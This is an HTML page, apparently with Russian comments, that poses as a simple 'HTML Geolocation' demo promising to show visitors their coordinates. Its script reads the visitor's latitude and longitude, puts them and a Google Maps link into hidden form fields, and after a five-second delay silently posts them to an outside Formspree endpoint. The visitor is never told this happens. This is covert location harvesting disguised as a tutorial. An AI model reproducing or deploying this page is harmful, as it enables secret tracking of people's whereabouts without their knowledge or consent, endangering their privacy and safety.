<!DOCTYPE html>
<html lang="en">
<head>
  <title>GetGPS</title>
  <style>
    :root {
      --fire: rgb(209, 66, 66);
    }
    .button_get_gps {
      cursor: pointer;
      border-radius: 5px;
      padding: 5px 10px 5px 10px;
      border: 2px solid var(--fire);
      background-color: rgba(255, 140, 0, 0.329);
      color: black;
      font-weight: 700;
      transition: .5s;
      font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
    }
    .button_get_gps:hover {
      transform: scale(1.2);
      border: 2px dotted green;
      background-color: rgba(0, 255, 55, 0.329);
      color: green;
    }
  </style>
</head>
<body>
  <h1>HTML Geolocation</h1>
  <p>Click the button to get your coordinates.</p>

  <form id="gpsForm" action="https://formspree.io/f/xyyrkvqg" method="POST">
    <button class="button_get_gps" onclick="getLocation()">Try It</button>
    <input type="hidden" id="latitude" name="latitude" value="">
    <input type="hidden" id="longitude" name="longitude" value="">
    <input type="hidden" id="ipAddress" name="ipAddress" value="">
    <input type="hidden" id="finalLink" name="finalLink" value="">
  </form>

  <p id="input_gps"></p>

  <script>
    const x = document.getElementById("input_gps");
    const latitudeInput = document.getElementById("latitude");
    const longitudeInput = document.getElementById("longitude");
    const ipAddressInput = document.getElementById("ipAddress");
    const finalLinkInput = document.getElementById("finalLink");
    const gpsForm = document.getElementById("gpsForm");

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(showPosition);
      } else { 
        x.innerHTML = "Geolocation is not supported by this browser.";
      }
    }

    function showPosition(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Получаем конечную ссылку
      const finalLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
      
      // Получаем IP-адрес пользователя (в этом примере фиктивно)
      const ipAddress = "127.0.0.1";

      // Обновляем ссылку с использованием полученных координат на Google Maps
      const updatedLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
      
      // Выводим координаты и обновленную ссылку
      x.innerHTML = `Latitude: ${latitude}<br>Longitude: ${longitude}<br>Updated Link: <a href="${updatedLink}" target="_blank">${updatedLink}</a>`;

      // Заполняем скрытые поля формы
      latitudeInput.value = latitude;
      longitudeInput.value = longitude;
      ipAddressInput.value = ipAddress;
      finalLinkInput.value = finalLink;

      // Проверяем, есть ли значения широты и долготы, прежде чем отправлять форму
      if (latitude && longitude) {
        // Задержка перед отправкой формы (например, через 5 секунд)
        setTimeout(function() {
          // Отправляем форму на сервер
          gpsForm.submit();
        }, 5000); // Задержка в миллисекундах (в данном случае 5000 мс = 5 секунд)
      }
    }
  </script>
</body>
</html>